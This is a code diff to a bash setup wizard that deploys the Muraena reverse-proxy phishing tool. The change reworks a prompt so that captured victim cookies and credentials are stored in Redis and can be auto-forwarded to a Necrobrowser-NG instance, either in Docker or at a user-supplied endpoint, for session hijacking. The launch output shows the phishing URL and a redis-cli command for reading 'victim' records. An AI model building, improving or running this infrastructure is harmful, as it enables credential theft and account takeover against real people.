@@ -63,19 +63,21 @@ gather_config() {
     read -r TRACKING_CHOICE
     TRACKING_CHOICE="${TRACKING_CHOICE:-Y}"
 
-    section "Necrobrowser-NG"
-    ask "Enable Necrobrowser-NG integration? [y/N]:"
-    read -r NECRO_CHOICE
-    NECRO_CHOICE="${NECRO_CHOICE:-N}"
+    section "Session Handling"
+    echo "  What should Muraena do with captured cookies and credentials?"
+    echo ""
+    echo "  1) Store only     — save to Redis; inspect manually with redis-cli"
+    echo "  2) Store + send   — save to Redis AND forward to Necrobrowser-NG"
+    echo "                      (runs Necrobrowser-NG in Docker automatically)"
+    echo "  3) Store + send   — save to Redis AND forward to an existing"
+    echo "                      Necrobrowser-NG instance you already have running"
+    echo ""
+    ask "Choose [1/2/3] (default: 1):"
+    read -r SESSION_MODE
+    SESSION_MODE="${SESSION_MODE:-1}"
 
-    if [[ "$NECRO_CHOICE" =~ ^[Yy]$ ]]; then
-        echo "  1) Run Necrobrowser-NG in Docker alongside Muraena (recommended)"
-        echo "  2) Use an existing Necrobrowser-NG instance"
-        ask "Choose [1/2]:"
-        read -r NECRO_DEPLOY
-        NECRO_DEPLOY="${NECRO_DEPLOY:-1}"
-
-        if [[ "$NECRO_DEPLOY" == "2" ]]; then
+    if [[ "$SESSION_MODE" =~ ^[23]$ ]]; then
+        if [[ "$SESSION_MODE" == "3" ]]; then
             ask "Necrobrowser-NG endpoint URL (e.g. http://10.0.0.5:3000/instrument):"
             read -r NECRO_ENDPOINT
             [[ -z "$NECRO_ENDPOINT" ]] && error "Endpoint is required."
@@ -152,7 +154,7 @@ write_config() {
     [[ "$TRACKING_CHOICE" =~ ^[Yy]$ ]] && tracking_enable="true"
 
     local necro_block=""
-    if [[ "$NECRO_CHOICE" =~ ^[Yy]$ ]]; then
+    if [[ "$SESSION_MODE" =~ ^[23]$ ]]; then
         # Build comma-separated cookie list as TOML array
         IFS=',' read -ra COOKIE_ARR <<< "$NECRO_COOKIES"
         local cookie_toml=""
@@ -275,7 +277,7 @@ JSON
 # ── docker-compose override for necrobrowser ─────────────────────────────────
 
 write_compose_override() {
-    if [[ "${NECRO_DEPLOY:-0}" == "1" ]]; then
+    if [[ "${SESSION_MODE:-1}" == "2" ]]; then
         info "Necrobrowser-NG will be cloned and started in Docker..."
 
         if [[ ! -d necrobrowser-ng ]]; then
@@ -319,9 +321,17 @@ launch() {
     else
         echo -e "  ${BOLD}URL             :${RESET} http://${PHISHING_DOMAIN}:8080"
     fi
+
+    case "${SESSION_MODE:-1}" in
+        1) echo -e "  ${BOLD}Sessions        :${RESET} Store in Redis only" ;;
+        2) echo -e "  ${BOLD}Sessions        :${RESET} Store in Redis + auto-forward to Necrobrowser-NG (Docker)" ;;
+        3) echo -e "  ${BOLD}Sessions        :${RESET} Store in Redis + auto-forward to ${NECRO_ENDPOINT}" ;;
+    esac
+
     echo ""
-    echo -e "  ${BOLD}Logs  :${RESET} docker compose logs -f muraena"
-    echo -e "  ${BOLD}Stop  :${RESET} docker compose down"
+    echo -e "  ${BOLD}Inspect Redis   :${RESET} docker compose exec redis redis-cli hgetall victim:<ID>"
+    echo -e "  ${BOLD}Logs            :${RESET} docker compose logs -f muraena"
+    echo -e "  ${BOLD}Stop            :${RESET} docker compose down"
     echo ""
 }
 
@@ -346,8 +356,8 @@ main() {
 
     section "Writing Configuration"
     write_config
-    [[ "$NECRO_CHOICE" =~ ^[Yy]$ ]] && write_necro_profile
-    [[ "$NECRO_CHOICE" =~ ^[Yy]$ ]] && write_compose_override
+    [[ "$SESSION_MODE" =~ ^[23]$ ]] && write_necro_profile
+    [[ "$SESSION_MODE" =~ ^[23]$ ]] && write_compose_override
 
     launch
 }
